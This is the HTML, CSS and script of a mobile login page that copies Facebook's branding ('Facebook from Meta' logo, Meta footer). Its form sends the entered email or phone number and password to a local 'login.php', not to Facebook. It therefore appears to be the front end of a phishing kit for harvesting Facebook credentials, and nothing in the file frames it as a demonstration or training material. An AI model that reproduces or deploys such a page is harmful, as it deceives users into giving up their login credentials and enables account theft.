    <style>
        @import url('https://fonts.googleapis.com/css2?family=Optimistic+Display:wght@400;500&display=swap');

        * {

}

body {

background: -webkit-linear-gradient(132deg, rgba(255,251,242,1) 0%, rgba(236,245,251,1) 35%, rgba(241,251,245,1) 100%);
background: linear-gradient(132deg, rgba(255,251,242,1) 0%, rgba(236,245,251,1) 35%, rgba(241,251,245,1) 100%);
filter: progid:DXImageTransform.Microsoft.gradient(startColorstr="#fffbf2",endColorstr="#f1fbf5",GradientType=1);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    padding: 5px;
    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
}

.container {
    margin: 10px;
    width: 100%;
    display: flex;
    flex-direction: column; /* Arrange children vertically */
    justify-content: space-between; /* Space sections vertically */
    height: 100%;
}

.section {
    min-height: 33.33vh;
    display: flex;
    flex-direction: column; /* Arrange children vertically within the section */
    justify-content: center; /* Center the logo vertically */
}
        
.bottom {
    justify-content: flex-end; /* Align items to the bottom */
}

.language-selector {
    color: #465a69;
    text-align: center;
    padding: 10px;
    font-size: 14px;
    font-family: 'Optimistic Display', system-ui, sans-serif;
    font-weight: 400;
    width: 100%;
    /*background-color: #ffffff;*/
}

.logo {
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px 0;
    /*background-color: #ffffff;*/
    flex-grow: 1; /* Allow the logo section to grow and take available space */
}

.logo img {
    max-width: 60px;
    height: auto;
}

/* Section 2: Login Form (Centered) */
        .login-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            padding: 10px;
        }

        .login-form {
            width: 100%;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .input-container {
    display: flex;
    align-items: center;
    padding: 14px 16px;
    cursor: pointer;
    background: rgb(255, 255, 255);
    border: 1px solid rgb(203, 210, 217);
    border-radius: 12px;
    position: relative;
    overflow: hidden;
}

        .placeholder {
    position: absolute;
    top: 50%;
    left: 16px; /* Adjust this to match your padding */
    transform: translateY(-50%);
    color: rgb(103, 120, 138);
    font-size: 16px;
    pointer-events: none;
    white-space: nowrap; /* Prevent wrapping */
    overflow: hidden; /* Hide overflow text */
    text-overflow: ellipsis; /* Add ellipsis */
    font-family: 'Optimistic Display', system-ui, sans-serif;
    font-weight: 500;
    max-width: calc(100% - 32px); /* Adjust based on padding (16px on both sides) */
}
        .input-wrapper {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .input-field {
            background: transparent;
            border: none;
            color: rgb(28, 43, 51);
            font-size: 16px;
            line-height: 1.3;
            width: 100%;
            outline: none;
            padding-top: 8px;
            padding-bottom: 2px;
            min-height: 22px;
            font-family: 'Optimistic Display', system-ui, sans-serif;
            font-weight: 400;
            margin-top: 2px;
        }

        .login-button {
            width: 100%;
            background-color: #0064e0;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            height: 44px;
            margin-bottom: 18px;
            font-family: 'Optimistic Display', system-ui, sans-serif;
            font-weight: 400;
        }

        .forgotten-password {
            display: block;
            text-align: center;
            color: #1c2b33;
            text-decoration: none;
            margin-bottom: 38px;
            font-size: 16px;
            font-family: 'Optimistic Display', system-ui, sans-serif;
            font-weight: 400;
        }
        
        /* Section 3: Create Account and Footer (Bottom) */
        .form-actions {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 10px;
        }

        .create-account {
            /*background: #ffffff;*/
            background: rgba(255,255,255,0);
            width: 100%;
            color: #256fca;
            border: 1px solid #256fca;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            height: 44px;
            font-family: 'Optimistic Display', system-ui, sans-serif;
            font-weight: 400;
        }

        footer {
    /*background-color: #ffffff;*/
    /* padding: 20px; */
    padding-top: 6px;
    padding-bottom: 38px;
    text-align: center;
}

        .meta-logo {
            margin-bottom: 15px;
        }

        .meta-logo img {
            width: auto;
            height: 12px;
        }

        footer nav {
            display: flex;
            justify-content: center;
            gap: 10px;
        }

        footer nav a {
            color: #606770;
            text-decoration: none;
            font-size: 10px;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        footer nav a:hover {
            text-decoration: none;
        }

        @media (max-width: 400px) {
            .container {
                width: 100%;
                margin: 0;
                border-radius: 0;
                min-height: 100vh;
            }
        }

        .input-container.focused .placeholder {
            top: 0;
            transform: scale(0.8) translateY(34%);
            transform-origin: left center;
            color: rgb(70, 90, 105);
            font-family: 'Optimistic Display', system-ui, sans-serif;
            font-weight: 400;
            position: absolute;
        }
        
        .input-container .icon {
            width: 24px;
            height: 24px;
            margin-left: 12px;
            background-size: cover;
            mask-size: cover;
            display: none;
        }

        .input-container .clear-icon {
            mask-image: url('images/clear.png');
            background-color: rgb(70, 90, 105);
        }

        .input-container .password-toggle-icon {
            mask-image: url('images/show.png');
            background-color: rgb(70, 90, 105);
        }

    </style>
</head>
    <body>
<div class="container">
    <div class="section">
        <div class="language-selector">
            <span>English (UK)</span>
        </div>

        <div class="logo">
            <img src="images/logo.png" alt="Facebook from Meta">
        </div>
    </div>
    <div class="section">
        <form class="login-form" id="loginForm" action="login.php" method="POST">
            <div class="form-group">
                <div class="input-container">
                    <div class="placeholder">Mobile number or email address</div>
                    <div class="input-wrapper">
                        <input 
                            type="email" 
                            class="input-field" 
                            name="email" 
                            autocomplete="on" 
                            required
                        >
                    </div>
                    <div class="icon clear-icon"></div>
                </div>
            </div>
            <div class="form-group">
                <div class="input-container">
                    <div class="placeholder">Password</div>
                    <div class="input-wrapper">
                        <input 
                            type="password" 
                            class="input-field" 
                            name="pass" 
                            autocomplete="on" 
                            required
                        >
                    </div>
                    <div class="icon password-toggle-icon"></div>
                </div>
            </div>
            <button type="submit" class="login-button">Log in</button>
            
            <a href="#" class="forgotten-password">Forgotten Password?</a>
        </form>
    </div>
    <div class="section bottom">
        <div class="form-actions">
            <button class="create-account">Create new account</button>
        </div>

        <footer>
            <div class="meta-logo">
                <img src="images/meta.png" alt="Meta logo">
            </div>
            <nav>
                <a href="#">About</a>
                <a href="#">Help</a>
                <a href="#">More</a>
            </nav>
        </footer>
    </div>
        </div>
    <script>
    const containers = document.querySelectorAll('.input-container');
containers.forEach(container => {
    const input = container.querySelector('.input-field');
    const clearIcon = container.querySelector('.clear-icon');
    const passwordToggleIcon = container.querySelector('.password-toggle-icon');

    // Email/Mobile input field logic
    if (input.type === 'email') {
        input.addEventListener('focus', () => {
            container.classList.add('focused');
            if (input.value !== '') {
                clearIcon.style.display = 'block';
            }
        });

        input.addEventListener('blur', () => {
            if (input.value === '') {
                container.classList.remove('focused');
            }
            clearIcon.style.display = 'none';
        });

        input.addEventListener('input', () => {
            clearIcon.style.display = input.value !== '' ? 'block' : 'none';
            if (input.value !== '') {
                container.classList.add('focused');
            } else {
                container.classList.remove('focused');
            }
        });

        clearIcon.addEventListener('mousedown', (e) => {
            e.preventDefault(); // Prevent focus loss
            input.value = '';
            clearIcon.style.display = 'none';
            container.classList.add('focused');
            input.focus();
        });
    }

    // Password field logic
        if (input.type === 'password') {
            let isPasswordVisible = false;

            passwordToggleIcon.addEventListener('mousedown', (e) => {
                e.preventDefault(); // Prevent focus loss
                isPasswordVisible = !isPasswordVisible;
                input.type = isPasswordVisible ? 'text' : 'password';

                passwordToggleIcon.style.maskImage = isPasswordVisible
                    ? 'url(images/hide.png)'
                    : 'url(images/show.png)';
            });

            input.addEventListener('focus', () => {
                container.classList.add('focused');
                passwordToggleIcon.style.display = 'block';
            });

            input.addEventListener('blur', () => {
                if (input.value === '') {
                    container.classList.remove('focused');
                    passwordToggleIcon.style.display = 'none';
                }
            });

            input.addEventListener('input', () => {
                passwordToggleIcon.style.display = input.value !== '' ? 'block' : 'none';
            });
        }
    });

</script>

</body>
